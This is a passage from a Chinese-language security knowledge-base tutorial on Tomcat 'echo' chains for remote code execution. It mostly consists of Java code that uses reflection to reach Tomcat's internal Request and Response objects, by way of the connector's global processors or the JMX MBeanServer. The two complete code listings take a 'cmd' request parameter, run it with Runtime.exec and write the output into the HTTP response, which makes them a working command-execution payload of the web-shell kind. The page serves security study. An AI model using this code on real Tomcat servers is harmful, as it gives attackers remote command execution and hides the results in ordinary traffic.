standardRoot = (StandardRoot) resources.get(contextClassLoader);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">StandardContext standardContext = (StandardContext) standardRoot.getContext();</span><br></span></code></pre></div></div>
<p>2、获取<code>StandardContext</code>中的<code>context</code></p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Field context = standardContext.getClass().getDeclaredField(&quot;context&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">context.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">org.apache.catalina.core.ApplicationContext applicationContext = (ApplicationContext) context.get(standardContext);</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20220210100818723" src="/assets/images/image-20220210100818723-c18986948389e577d467d09c009bd107.png" width="948" height="1170" class="img_ev3q"></p>
<p>3、获取<code>context</code>中的<code>service</code></p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Field service = applicationContext.getClass().getDeclaredField(&quot;service&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">service.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">org.apache.catalina.core.StandardService standardService = (StandardService) service.get(applicationContext);</span><br></span></code></pre></div></div>
<p>4、获取<code>service</code>中的<code>connectors</code></p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Field connectors = standardService.getClass().getDeclaredField(&quot;connectors&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">connectors.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">org.apache.catalina.connector.Connector[] connectors1 = (Connector[]) connectors.get(standardService);</span><br></span></code></pre></div></div>
<p>5、反射获取 <code>AbstractProtocol$ConnectoinHandler</code> 实例</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ProtocolHandler protocolHandler = connectors1[0].getProtocolHandler();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Field handler = org.apache.coyote.AbstractProtocol.class.getDeclaredField(&quot;handler&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">handler.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">org.apache.tomcat.util.net.AbstractEndpoint.Handler handler1 = (AbstractEndpoint.Handler) handler.get(protocolHandler);</span><br></span></code></pre></div></div>
<p>6、反射获取<code>global</code>内部的<code>processors</code></p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) handler1.getGlobal();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Field processors = requestGroupInfo.getClass().getDeclaredField(&quot;processors&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">processors.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ArrayList&lt;org.apache.coyote.RequestInfo&gt; processors1 = (ArrayList) processors.get(requestGroupInfo);</span><br></span></code></pre></div></div>
<p>7、获取<code>response</code>输出内容</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Field req = RequestInfo.class.getDeclaredField(&quot;req&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">req.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">for (org.apache.coyote.RequestInfo requestInfo : processors1) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    org.apache.coyote.Request request1 = (org.apache.coyote.Request) req.get(requestInfo);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	// 转换为 org.apache.catalina.connector.Request 类型</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.getNote(1);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	org.apache.catalina.connector.Response response1 = request2.getResponse();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	PrintWriter writer = response1.getWriter();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	writer.write(&quot;tomcat echo&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	writer.flush();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p>代码汇总：</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">// 获取 StandardContext</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        try {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            // 反射获取StandardContext中的context</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            Field context = standardContext.getClass().getDeclaredField(&quot;context&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            context.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            org.apache.catalina.core.ApplicationContext applicationContext = (ApplicationContext) context.get(standardContext);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            // 反射获取context中的service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            Field service = applicationContext.getClass().getDeclaredField(&quot;service&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            service.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            org.apache.catalina.core.StandardService standardService = (StandardService) service.get(applicationContext);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            // 反射获取service中的connectors</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            Field connectors = standardService.getClass().getDeclaredField(&quot;connectors&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            connectors.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            org.apache.catalina.connector.Connector[] connectors1 = (Connector[]) connectors.get(standardService);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            // 反射获取 AbstractProtocol$ConnectoinHandler 实例</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            ProtocolHandler protocolHandler = connectors1[0].getProtocolHandler();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            Field handler = org.apache.coyote.AbstractProtocol.class.getDeclaredField(&quot;handler&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            handler.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            org.apache.tomcat.util.net.AbstractEndpoint.Handler handler1 = (AbstractEndpoint.Handler) handler.get(protocolHandler);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            // 反射获取global内部的processors</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) handler1.getGlobal();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            Field processors = requestGroupInfo.getClass().getDeclaredField(&quot;processors&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            processors.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            ArrayList&lt;org.apache.coyote.RequestInfo&gt; processors1 = (ArrayList) processors.get(requestGroupInfo);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            // 获取response修改数据</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            // 下面循环，可以在这先获取req实例，避免每次循环都反射获取一次</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            Field req = RequestInfo.class.getDeclaredField(&quot;req&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            req.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            for (org.apache.coyote.RequestInfo requestInfo : processors1) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                org.apache.coyote.Request request1 = (org.apache.coyote.Request) req.get(requestInfo);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                // 转换为 org.apache.catalina.connector.Request 类型</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.getNote(1);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                org.apache.catalina.connector.Response response1 = request2.getResponse();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                // 获取参数</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                PrintWriter writer = response1.getWriter();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                String cmd = request2.getParameter(&quot;cmd&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                if (cmd != null) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    Process exec = Runtime.getRuntime().exec(cmd);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    InputStream inputStream = exec.getInputStream();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    DataInputStream dataInputStream = new DataInputStream(inputStream);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    String disr = dataInputStream.readLine();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    while ( disr != null ) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        writer.write(disr);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        disr = dataInputStream.readLine();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                writer.flush();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            } catch (IllegalAccessException illegalAccessException) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            illegalAccessException.printStackTrace();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        } catch (NoSuchFieldException noSuchFieldException) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            noSuchFieldException.printStackTrace();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span></code></pre></div></div>
<p>效果</p>
<p><img decoding="async" loading="lazy" alt="image-20220210114240691" src="/assets/images/image-20220210114240691-aaaa7ed3fcebfda87a4eee24f368cac3.png" width="1100" height="156" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="跟踪registryregistercomponent">跟踪<code>Registry.registerComponent()</code><a href="#跟踪registryregistercomponent" class="hash-link" aria-label="跟踪registryregistercomponent的直接链接" title="跟踪registryregistercomponent的直接链接">​</a></h4>
<p>跟进<code>org.apache.tomcat.util.modeler.Registry#registerComponent(java.lang.Object, javax.management.ObjectName, java.lang.String)</code>这个函数，发现会给<code>RequestInfo</code>对象注册到<code>MBeanServer</code>中</p>
<p><code>oname</code>的值为<code>Tomcat:name=HttpRequest1,type=RequestProcessor,worker=&quot;http-nio-8080&quot;</code></p>
<p><img decoding="async" loading="lazy" alt="image-20220210124145698" src="/assets/images/image-20220210124145698-6176ef142b87c09aeddd0a029f837a78.png" width="3414" height="1366" class="img_ev3q"></p>
<p>所以如果能通过<code>MBeanServer</code>来获取到相关的信息，会更加的方便直接</p>
<p>分析一下，通过<code>Registry#getMBeanServer()</code>函数能够直接获取到<code>MBeanServer</code>实例</p>
<p><img decoding="async" loading="lazy" alt="image-20220210124548884" src="/assets/images/image-20220210124548884-f1ccb5c3773ae38cf34af8d8fb84beeb.png" width="1746" height="1018" class="img_ev3q"></p>
<p>所以现在问题是怎么拿到<code>org.apache.tomcat.util.modeler.Registry</code>这个类的实例，我们还是分析一下应用是怎么拿到的，然后模拟一下即可</p>
<p>它是直接使用<code>Registry.getRegistry(null, null)</code>来获取的</p>
<p><img decoding="async" loading="lazy" alt="image-20220210125302698" src="/assets/images/image-20220210125302698-86fc08574385d8b00f2c5233f8a84311.png" width="2248" height="1244" class="img_ev3q"></p>
<p>所以我们也模拟一下这个过程，整个过程中变量<code>.getClass</code>是什么类我们就给他转换为什么类即可</p>
<blockquote>
<p>如<code>jmxMBeanServer.mbsInterceptor.getClass()</code>的类是<code>com.sun.jmx.interceptor.DefaultMBeanServerInterceptor</code>，我们就给他转换过去即可</p>
<p>老实说<code>MBeanServer</code>到<code>RequestInfo</code>的过程还是有点难找，不知道有没有啥快的办法，还是大佬们牛逼</p>
</blockquote>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">com.sun.jmx.mbeanserver.JmxMBeanServer jmxMBeanServer = (com.sun.jmx.mbeanserver.JmxMBeanServer) org.apache.tomcat.util.modeler.Registry.getRegistry(null, null).getMBeanServer();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">com.sun.jmx.interceptor.DefaultMBeanServerInterceptor defaultMBeanServerInterceptor = (DefaultMBeanServerInterceptor) jmxMBeanServer.mbsInterceptor;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">com.sun.jmx.mbeanserver.Repository repository = defaultMBeanServerInterceptor.repository;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">repository.query(new ObjectName(&quot;*:type=GlobalRequestProcessor,name=\&quot;http*\&quot;&quot;), null);</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20220210131031927" src="/assets/images/image-20220210131031927-26908ff57df3319594f43265250146c0.png" width="2514" height="1154" class="img_ev3q"></p>
<p>这里由于测试的关系只存在一个对象，在具体构造时可以直接遍历所有符合条件的情况。有了<code>RequestInfo</code>，那我们就可以拿到<code>response</code>完成回显了</p>
<p>利用链：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">jmxMBeanServer-&gt;resource（和上面的global一样）-&gt;-&gt;processors-&gt;RequestInfo-&gt;req-&gt;response</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="mbeanserver链路代码">MBeanServer链路代码<a href="#mbeanserver链路代码" class="hash-link" aria-label="MBeanServer链路代码的直接链接" title="MBeanServer链路代码的直接链接">​</a></h4>
<p>这个比上面的要简单一些，可以尝试自己多写写</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">try {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            com.sun.jmx.mbeanserver.JmxMBeanServer jmxMBeanServer = (com.sun.jmx.mbeanserver.JmxMBeanServer) org.apache.tomcat.util.modeler.Registry.getRegistry(null, null).getMBeanServer();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            Field mbsInterceptor = com.sun.jmx.mbeanserver.JmxMBeanServer.class.getDeclaredField(&quot;mbsInterceptor&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            mbsInterceptor.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            com.sun.jmx.interceptor.DefaultMBeanServerInterceptor defaultMBeanServerInterceptor = (DefaultMBeanServerInterceptor) mbsInterceptor.get(jmxMBeanServer);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            Field repository = defaultMBeanServerInterceptor.getClass().getDeclaredField(&quot;repository&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            repository.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            com.sun.jmx.mbeanserver.Repository repository1 = (Repository) repository.get(defaultMBeanServerInterceptor);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            HashSet&lt;com.sun.jmx.mbeanserver.NamedObject&gt; hashSet = (HashSet&lt;com.sun.jmx.mbeanserver.NamedObject&gt;) repository1.query(new javax.management.ObjectName(&quot;*:type=GlobalRequestProcessor,name=\&quot;http*\&quot;&quot;), null);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            for (com.sun.jmx.mbeanserver.NamedObject namedObject : hashSet ) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                Field object = namedObject.getClass().getDeclaredField(&quot;object&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                object.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                org.apache.tomcat.util.modeler.BaseModelMBean baseModelMBean = (BaseModelMBean) object.get(namedObject);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                Field resource = baseModelMBean.getClass().getDeclaredField(&quot;resource&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                resource.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                org.apache.coyote.RequestGroupInfo requestGroupInfo = (RequestGroupInfo) resource.get(baseModelMBean);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                Field processors = requestGroupInfo.getClass().getDeclaredField(&quot;processors&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                processors.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                ArrayList&lt;org.apache.coyote.RequestInfo&gt; processors1 = (ArrayList) processors.get(requestGroupInfo);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                // 获取response修改数据</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                // 下面循环，可以在这先获取req实例，避免每次循环都反射获取一次</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                Field req = RequestInfo.class.getDeclaredField(&quot;req&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                req.setAccessible(true);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                for (org.apache.coyote.RequestInfo requestInfo : processors1) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    org.apache.coyote.Request request1 = (org.apache.coyote.Request) req.get(requestInfo);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    // 转换为 org.apache.catalina.connector.Request 类型</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.getNote(1);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    org.apache.catalina.connector.Response response1 = request2.getResponse();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    // 获取参数</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    PrintWriter writer = response1.getWriter();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    String cmd = request2.getParameter(&quot;cmd&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    if (cmd != null) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        Process exec = Runtime.getRuntime().exec(cmd);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        InputStream inputStream = exec.getInputStream();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        DataInputStream dataInputStream = new DataInputStream(inputStream);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        String disr = dataInputStream.readLine();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        while (disr != null) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            writer.write(disr);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            disr = dataInputStream.readLine();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    writer.flush();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        } catch (NoSuchFieldException | IllegalAccessException | MalformedObjectNameException e) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            e.printStackTrace();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span></code></pre></div></div>
<p>效果：</p>
<p><img decoding="async" loading="lazy" alt="image-20220210161315396" src="/assets/images/image-20220210161315396-5f4fb04595d43162bbff599d3dcd7217.png" width="1066" height="130" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="总结">总结<a href="#总结" class="hash-link" aria-label="总结的直接链接" title="总结的直接链接">​</a></h2>
<ol>
<li>最后代码实现过程还是比较简单，主要还是分析过程找到一条可利用的链</li>
<li>平时我们要拿到一个内存中的实例对象，主要有两种方法：<!-- -->
<ol>
<li>反射</li>
<li>向上回溯分析，应用是怎么初始化这个实例的，找关联函数、类、类变量等，再得到这个实例</li>
</ol>
</li>
<li>向上一直回溯到可以通过一些方法获取到内存中的实例为止，如<code>Registry.getRegistry(null, null).getMBeanServer()</code>，相当于找到整条链的头</li>
<li>编写代码过程中不知道返回的对象是哪一个类的，可以通过debug调试看到，然后再进行类型转换</li>
</ol>
<div class="theme-admonition theme-admonition-warning admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>注意</div><div class="admonitionContent_BuS1"><p>如有错误，敬请指正</p></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="参考">参考<a href="#参考" class="hash-link" aria-label="参考的直接链接" title="参考的直接链接">​</a></h2>
<ul>
<li><a href="https://lucifaer.com/2020/05/12/Tomcat%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener noreferrer">Tomcat通用回显学习</a></li>
<li><a href="https://www.anquanke.com/post/id/264821" target="_blank" rel="noopener noreferrer">Tomcat回显技术学习汇总</a></li>
</ul></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"></div><div class="col lastUpdated_JAkA"><span class="theme-last-updated">最后<!-- -->由 <b>d4m1ts</b> <!-- -->于 <b><time datetime="2025-06-14T04:13:25.000Z" itemprop="dateModified">2025年6月14日</time></b> <!-- -->更新</span></div></div></footer></article><nav class="pagination-nav" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/category/rce回显链"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">RCE回显链</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/category/内存马"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">内存马</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#介绍" class="table-of-contents__link toc-highlight">介绍</a><ul><li><a href="#优势" class="table-of-contents__link toc-highlight">优势</a></li><li><a href="#实现手法" class="table-of-contents__link toc-highlight">实现手法</a></li></ul></li><li><a href="#快速搭建tomcat调试环境" class="table-of-contents__link toc-highlight">快速搭建tomcat调试环境</a><ul><li><a href="#创建maven项目" class="table-of-contents__link toc-highlight">创建maven项目</a></li><li><a href="#修改pomxml" class="table-of-contents__link toc-highlight">修改pom.xml</a></li><li><a href="#创建java代码文件夹" class="table-of-contents__link toc-highlight">创建Java代码文件夹</a></li><li><a href="#创建启动类" class="table-of-contents__link toc-highlight">创建启动类</a></li><li><a href="#创建servlet" class="table-of-contents__link toc-highlight">创建servlet</a></li></ul></li><li><a href="#servlet过程分析" class="table-of-contents__link toc-highlight">servlet过程分析</a></li><li><a href="#利用链挖掘" class="table-of-contents__link toc-highlight">利用链挖掘</a><ul><li><a href="#response获取" class="table-of-contents__link toc-highlight">response获取</a></li><li><a href="#http11processor类相关" class="table-of-contents__link toc-highlight">Http11Processor类相关</a><ul><li><a href="#获取global" class="table-of-contents__link toc-highlight">获取global</a></li><li><a href="#global链路代码" class="table-of-contents__link toc-highlight">global链路代码</a></li><li><a href="#跟踪registryregistercomponent" class="table-of-contents__link toc-highlight">跟踪<code>Registry.registerComponent()</code></a></li><li><a href="#mbeanserver链路代码" class="table-of-contents__link toc-highlight">MBeanServer链路代码</a></li></ul></li></ul></li><li><a href="#总结" class="table-of-contents__link toc-highlight">总结</a></li><li><a href="#参考" class="table-of-contents__link toc-highlight">参考</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 d4m1ts 知识库.</div></div></div></footer></div>
</body>
</html>